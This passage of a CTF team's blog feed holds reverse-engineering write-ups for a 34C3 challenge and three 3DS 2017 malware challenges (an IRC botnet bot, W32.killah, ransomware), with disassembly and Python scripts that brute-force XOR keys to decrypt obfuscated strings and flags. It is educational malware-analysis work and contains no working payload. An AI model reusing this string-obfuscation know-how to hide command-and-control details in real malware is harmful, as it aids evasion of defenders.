0x7f3e3151b0e9      e9db010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0ee      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b0ef      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b0f0      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b0f2      3c52           cmp al, 0x52            ; &apos;R&apos; ; 82</span><br><span class="line">  ========&lt; 0x7f3e3151b0f4      0f85ed010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b0fa      e9ca010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b0ff      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b100      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b101      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b103      3c50           cmp al, 0x50            ; &apos;P&apos; ; 80</span><br><span class="line">  ========&lt; 0x7f3e3151b105      0f85dc010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b10b      e9b9010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b110      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b111      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b112      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b114      3c68           cmp al, 0x68            ; &apos;h&apos; ; 104</span><br><span class="line">  ========&lt; 0x7f3e3151b116      0f85cb010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b11c      e9a8010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b121      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b122      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b123      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b125      3c31           cmp al, 0x31            ; &apos;1&apos; ; 49</span><br><span class="line">  ========&lt; 0x7f3e3151b127      0f85ba010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b12d      e997010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   ;-- rax:</span><br><span class="line">  |||||||   0x7f3e3151b132      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b133      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b134      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b136      3c6e           cmp al, 0x6e            ; &apos;n&apos; ; 110</span><br><span class="line">  ========&lt; 0x7f3e3151b138      0f85a9010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b13e      e986010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b143      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b144      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b145      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b147      3c47           cmp al, 0x47            ; &apos;G&apos; ; 71</span><br><span class="line">  ========&lt; 0x7f3e3151b149      0f8598010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b14f      e975010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b154      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b155      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b156      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b158      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</span><br><span class="line">  ========&lt; 0x7f3e3151b15a      0f8587010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b160      e964010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b165      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b166      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b167      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b169      3c67           cmp al, 0x67            ; &apos;g&apos; ; 103</span><br><span class="line">  ========&lt; 0x7f3e3151b16b      0f8576010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b171      e953010000     jmp 0x7f3e3151b2c9</span><br><span class="line">  |||||||   0x7f3e3151b176      56             push rsi</span><br><span class="line">  |||||||   0x7f3e3151b177      52             push rdx</span><br><span class="line">  |||||||   0x7f3e3151b178      8a07           mov al, byte [rdi]</span><br><span class="line">  |||||||   0x7f3e3151b17a      3c30           cmp al, 0x30            ; &apos;0&apos; ; 48</span><br><span class="line">  ========&lt; 0x7f3e3151b17c      0f8565010000   jne 0x7f3e3151b2e7</span><br><span class="line">  ========&lt; 0x7f3e3151b182      e942010000     jmp 0x7f3e3151b2c9</span><br></pre></td></tr></table></figure><p>As you can you can see you can already check the flag and all comparisons that were being made, in my python script I was saving the addresses where each <strong>mini shellcode</strong> starts, so I could sort <strong>the byte order</strong> to get the right flag in the end:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python morph.py</span><br><span class="line">34C3_M1GHTY_M0RPh1nG_g0</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;m0rph 49 Solves: 163&lt;br&gt;&lt;br&gt;To get you started :)&lt;br&gt;&lt;br&gt;files: Link&lt;br&gt;&lt;br&gt;difficulty: easy&lt;br&gt;&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;Openin
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="radare2_script" scheme="https://teamrocketist.github.io/tags/radare2-script/"/>
    
      <category term="mmap" scheme="https://teamrocketist.github.io/tags/mmap/"/>
    
      <category term="34C3ctf2017" scheme="https://teamrocketist.github.io/tags/34C3ctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - IRC Bot Takeover</title>
    <link href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/"/>
    <id>https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/</id>
    <published>2017-12-19T22:09:52.000Z</published>
    <updated>2018-10-24T23:21:04.866Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>IRC Bot Takeover - 486 Points<br><br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br><br><br>Update: We had some problems with a specific step of the challenge (still possible to solve, but more hard) and we updated the binary. The new file has the old version, but you only need the new to solve.<br></blockquote><p>This malware was about controlling a bot net via IRC, we were allowed to access it since the url and port were bot present in the binary, but we didn’t really needed to access it to solve this, unless you infected a machine of yours to debug it to understand better how the malware works(some people actually did this I saw some bots from other players in a channel in IRC we actually could control them lol).</p><p>This challenge as in <a href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/">Ransomware</a>  and <a href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/">w32.killah</a> is once again to decrypt obfuscated strings, but this time they are encrypting the string two times:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/xRpDE8F.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xRpDE8F.png" alt=""><br></a></p><p>There were two executables, one of them was useless the one that has the encrypted flag was <strong>bot.exe</strong>.</p><p>The code above is present at the sub-routine <strong>sub_4012E1</strong> if you use IDA open the binary (bot.exe executable). Once again the xor_encryption2 is exactly like <a href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/">w32.killah</a>, I had to brute force the key once again, but this time since they are encrypting twice I need to brute force two keys instead of one:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</span><br><span class="line">n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</span><br><span class="line">s = chr(ord(edx[i]) ^ ord(al))</span><br><span class="line"><span class="comment">#print n,s</span></span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">c += s</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c += n</span><br><span class="line"><span class="comment">#print c</span></span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">e = xor_encrytion(al=chr(i), ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=<span class="string">'%&lt;EmqhiYUi0deY\\'</span>)</span><br><span class="line">h = xor_encrytion(al=chr(j), ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=e)</span><br><span class="line"><span class="keyword">print</span> h, i, j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">e = xor_encrytion(al=chr(i), ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=<span class="string">'mckW,sSWisWdak3!u'</span>)</span><br><span class="line">h = xor_encrytion(al=chr(j), ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=e)</span><br><span class="line"><span class="keyword">print</span> h, i, j</span><br></pre></td></tr></table></figure><p>The first part of the flag:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python ircbot.py | grep <span class="string">'3DS&#123;'</span></span><br><span class="line">3DS&#123;wpwgcw8lsgd 139 8</span><br><span class="line">3DS&#123;who_<span class="comment">#o0ls_d 229 98</span></span><br><span class="line">3DS&#123;who_<span class="comment">#o0ls_d 228 99</span></span><br><span class="line">3DS&#123;who_<span class="comment">#o0ls_d 230 99</span></span><br><span class="line">3DS&#123;who_co0ls_d 133 130</span><br><span class="line">3DS&#123;who_co0ls_d 132 131</span><br><span class="line">3DS&#123;who_co0ls_d 134 131</span><br></pre></td></tr></table></figure></p><p>The rest:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python ircbot.py | grep <span class="string">'&#125;\s'</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">uck_4sS_is_lak3!&#125; 224 100</span><br><span class="line">uow[4^?_[i^?[law?!&#125; 226 100</span><br><span class="line">Ec&#123;_^DsS_ys_la&#123;3!&#125; 232 100</span><br><span class="line">EoGk^D^?_ky^?klaG?!&#125; 234 100</span><br><span class="line">komQ*^?UQo^?Qlam5<span class="string">'&#125; 96 102</span></span><br><span class="line"><span class="string">ukoS(&#123;WSm&#123;Slao7%&#125; 98 102</span></span><br><span class="line"><span class="string">EmGY"^?]Yy^?YjoG=/&#125; 104 102</span></span><br><span class="line"><span class="string">EoC[ &#123;_[y&#123;[lmC?-&#125; 106 102</span></span><br><span class="line"><span class="string">uow[4^?_[i^?[law?!&#125; 224 102</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>A simple script to join the parts of the flag since we now know the keys:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</span><br><span class="line">n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</span><br><span class="line">s = chr(ord(edx[i]) ^ ord(al))</span><br><span class="line"><span class="comment">#print n,s</span></span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">c += s</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c += n</span><br><span class="line"><span class="comment">#print c</span></span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</span><br><span class="line">c += chr(ord(edx[i]) ^ ord(al))</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">a = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">7</span><span class="number">-1</span>, edx=<span class="string">'1`scg&#123;'</span>)</span><br><span class="line">b = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=<span class="string">'&#123;`q&lt;t`ww|&#125;vw&lt;|wf'</span>)</span><br><span class="line">c = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">0xa</span><span class="number">-1</span>, edx=<span class="string">'s``&#125;\x7f\x70\x73\x76\x7d'</span>)</span><br><span class="line">d = sub_4005D0(al=<span class="string">'\x12'</span>,ecx=<span class="number">0x8</span><span class="number">-1</span>, edx=<span class="string">'qsfgsps'</span>)</span><br><span class="line"></span><br><span class="line">f = xor_encrytion(al=<span class="string">'\x85'</span>, ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=<span class="string">'%&lt;EmqhiYUi0deY\\'</span>)</span><br><span class="line">g = xor_encrytion(al=<span class="string">'\x82'</span>, ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=f)</span><br><span class="line"></span><br><span class="line">h = xor_encrytion(al=<span class="string">'\xe4'</span>, ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=<span class="string">'mckW,sSWisWdak3!u'</span>)</span><br><span class="line">i = xor_encrytion(al=<span class="string">'\xc0'</span>, ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=h)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> a,b,c,d</span><br><span class="line"><span class="keyword">print</span> g+i</span><br></pre></td></tr></table></figure><p>Running it </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python ircbot.py</span><br><span class="line"><span class="comment">#raqui irc.freenode.net arrombado catuaba</span></span><br><span class="line"><span class="number">3</span>DS&#123;who_co0ls_duck_4sS_is_lak3!&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>3DS{who_co0ls_duck_4sS_is_lak3!}</strong>, note that the first line is other obfuscated strings you could decrypt to help you understand the control flow of the binary.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;IRC Bot Takeover - 486 Points&lt;br&gt;&lt;br&gt;WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!&lt;br&gt;&lt;br&gt;&lt;br&gt;Update: W
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - W32.killah</title>
    <link href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/"/>
    <id>https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/</id>
    <published>2017-12-19T21:15:19.000Z</published>
    <updated>2018-10-24T23:21:04.866Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>W32.killah - 487 Points<br><br>Caution.. “The flag is over there..”<br><br>Password: “infected!”<br><br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br></blockquote><p>Another malware problem, all malware problems were practically the same the writer of this challenge should have at least make it different from the others, as in <a href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/">Ransomware</a> we have to decrypt more obfuscated strings but this time the encryption function is more difficult to understand, it does a summation before a xor, and uses 8 bit based operations (8 bit registers), we can see the beginning of <strong>start</strong> function we are actually decrypting a string:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/JeRJKZs.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/JeRJKZs.png" alt=""><br></a></p><p>As I explained previously in <a href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/">Ransomware</a> <strong>ecx</strong> is storing the string length, <strong>al</strong> is the single byte used to encrypt the string and <strong>edx</strong> is where is stored the encrypted string.</p><p>Analysing the encryption function <strong>sub_4011A9</strong>, we can see it doesn’t only uses <strong>xor</strong> but it uses an addition operation before that:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Tpno1sA.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Tpno1sA.png" alt=""><br></a></p><p>We know that a character must be between 0 to 255, the additions will break this range, I’m not so sure about this but I think in assembly when there is an 8 bit operation if an overflow occurs, it returns back to 0 and that’s what I tried to write in python : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</span><br><span class="line">n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</span><br><span class="line">s = chr(ord(edx[i]) ^ ord(al))</span><br><span class="line"><span class="comment">#print n,s</span></span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">c += s</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c += n</span><br><span class="line"><span class="comment">#print c</span></span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line">buf = struct.pack (<span class="string">"17B"</span>, *[</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xca</span>,<span class="number">0xf2</span>,<span class="number">0xe3</span>,<span class="number">0xe9</span>,<span class="number">0xf3</span>,<span class="number">0xf9</span>,<span class="number">0xfb</span>,<span class="number">0xf6</span>,</span><br><span class="line"><span class="number">0xde</span>,<span class="number">0xe8</span>,<span class="number">0xf3</span>,<span class="number">0xec</span>,<span class="number">0xff</span>,<span class="number">0xaa</span>])</span><br></pre></td></tr></table></figure><p>Well this actually worked for the first encrypted string:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python w32killah.py</span><br><span class="line">3DS&#123;m4lw@r3_1</span><br></pre></td></tr></table></figure><p>And we got the first part of the flag… while searching in IDA I didn’t initially found the other encryption code until I started searching and found some code that wasn’t present in the function window:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/GX1e2Fy.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/GX1e2Fy.png" alt=""><br></a></p><p>Once again we need to decrypt that string but this time the function I wrote in python didn’t really work, outputed me a bunch of non printable characters, so I may misunderstood how actually 8 bit operations work in assembly, but I still managed to solve this by trying a bunch of other key bytes:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</span><br><span class="line">n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</span><br><span class="line">s = chr(ord(edx[i]) ^ ord(al))</span><br><span class="line"><span class="comment">#print n,s</span></span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</span><br><span class="line">c += s</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c += n</span><br><span class="line"><span class="comment">#print c</span></span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line"><span class="keyword">print</span> xor_encrytion(al=chr(i),ecx=<span class="number">0x10</span><span class="number">-1</span>,edx=struct.pack (<span class="string">"15B"</span>, *[</span><br><span class="line"><span class="number">0xb3</span>,<span class="number">0xdf</span>,<span class="number">0xa6</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xcb</span>,<span class="number">0xa9</span>,<span class="number">0xae</span>,<span class="number">0xc7</span>,<span class="number">0xdf</span>,<span class="number">0xa6</span>,</span><br><span class="line"><span class="number">0xb5</span>,<span class="number">0xae</span>,<span class="number">0xe1</span>,<span class="number">0xbd</span>])), i</span><br></pre></td></tr></table></figure><p>A there we go the key to decrypt the flag with the function I wrote was <strong>96</strong> in hex is <strong>0x60</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python w32.killah.py | grep <span class="string">'&#125;'</span></span><br><span class="line">s_fucKinG_fun!&#125; 96</span><br><span class="line">w<span class="comment">#jugOirK#jur!&#125; 98</span></span><br><span class="line">s<span class="string">'n&#125;cKivO'</span>n&#125;v!E 100</span><br><span class="line">&#125;!nmUkvI!nv<span class="comment">#G 101</span></span><br><span class="line"><span class="comment">#j&#125;oWirK#j&#125;r!E 102</span></span><br><span class="line">&#125;!j&#123;mUwrI!j&#123;r/C 103</span><br><span class="line">M!~O&#125;U&#123;vY!~Ov<span class="comment">#G 109</span></span><br><span class="line">M!zK&#125;UwrY!zKr?C 111</span><br><span class="line">/C:)?W52[C:)2&#125;! 156</span><br><span class="line">s_fuc</span><br><span class="line">     inG_fun!&#125; 192</span><br><span class="line">&#123;on&#125;k[afGon&#125;f)u 200</span><br><span class="line">&#125;ch&#123;mWg`ch&#123;`/s 206</span><br><span class="line">`</span><br><span class="line"> ufpMz&#125;I</span><br><span class="line">        uf&#125;2n 211</span><br><span class="line">g</span><br><span class="line"> rawK&#125;zO</span><br><span class="line">        raz5i 212</span><br><span class="line">ha&#125;nx&#125;ruya&#125;nu:f 219</span><br><span class="line">mcxk&#125;wwp&#123;cxkp?c 222</span><br></pre></td></tr></table></figure></p><p>The flag was <strong>3DS{m4lw@r3_1s_fucKinG_fun!}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;W32.killah - 487 Points&lt;br&gt;&lt;br&gt;Caution.. “The flag is over there..”&lt;br&gt;&lt;br&gt;Password: “infected!”&lt;br&gt;&lt;br&gt;WARNING! DON’T EXECU
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - Ransomware</title>
    <link href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/"/>
    <id>https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/</id>
    <published>2017-12-18T19:45:33.000Z</published>
    <updated>2018-10-24T23:21:04.862Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Ransomware - 464 Points<br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br></blockquote><p>We have a malware to analyse, right at the beginning(_start function) I found an encrypted string with xor, reversing it wasn’t very hard as you can see bellow:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/TN8MrPg.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TN8MrPg.png" alt=""><br></a></p><p>The actual function in the ida was this one:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/RTpcq1L.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/RTpcq1L.png" alt=""><br></a></p><p>Rewriting this function into python we ended up with this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</span><br><span class="line">c += chr(ord(edx[i]) ^ ord(al))</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">first = 